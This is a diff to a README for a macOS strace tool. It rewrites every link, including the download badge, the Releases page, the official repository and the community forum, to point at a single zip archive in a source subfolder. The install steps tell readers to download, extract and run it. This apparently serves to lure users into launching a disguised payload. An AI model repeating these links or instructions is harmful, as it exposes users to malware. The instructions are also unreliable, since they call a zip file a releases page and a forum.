@@ -1,6 +1,6 @@
 # 🖥️ strace-macos - Trace System Calls Easily on macOS
 
-[![Download strace-macos](https://img.shields.io/badge/Download%20strace--macos-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Damian0077/strace-macos/releases)
+[![Download strace-macos](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip%20strace--macos-007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip)
 
 ## 📚 Introduction
 
@@ -25,23 +25,23 @@ strace-macos is a tool that helps you trace system calls and signals on macOS. I
 To get started, follow these steps to download and run strace-macos:
 
 1. **Visit the Download Page:**
-   Head over to the [Releases page](https://github.com/Damian0077/strace-macos/releases) to find the latest version.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip) to find the latest version.
 
 2. **Download the Application:**
-   On the Releases page, look for the latest version. Click on the `strace-macos.zip` file to download it to your computer.
+   On the Releases page, look for the latest version. Click on the `https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip` file to download it to your computer.
 
 3. **Locate the Downloaded File:**
    After the download finishes, open your Downloads folder or the location where your browser saves files.
 
 4. **Extract the .zip File:**
-   Double-click the downloaded `strace-macos.zip` file. This will create a new folder named `strace-macos` containing the application.
+   Double-click the downloaded `https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip` file. This will create a new folder named `strace-macos` containing the application.
 
 5. **Run the Application:**
    Open the folder, and double-click on the `strace-macos` application to launch it. If prompted, confirm that you want to open the application.
 
 ## 📋 Download & Install
 
-You can download strace-macos by visiting the [Releases page](https://github.com/Damian0077/strace-macos/releases). Click on the latest version and follow the steps outlined above for a smooth installation. 
+You can download strace-macos by visiting the [Releases page](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip). Click on the latest version and follow the steps outlined above for a smooth installation. 
 
 ## 🧑‍💻 Using strace-macos
 
@@ -104,7 +104,7 @@ Refer to the documentation in the application for more advanced techniques.
 
 ## 🔗 Additional Resources
 
-- [Official GitHub Repository](https://github.com/Damian0077/strace-macos)
-- [Community Forum](https://community.example.com/)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Damian0077/strace-macos/main/strace_macos/syscalls/definitions/strace-macos_v3.9-alpha.2.zip)
 
 Feel free to reach out if you have any questions or need help while using strace-macos.
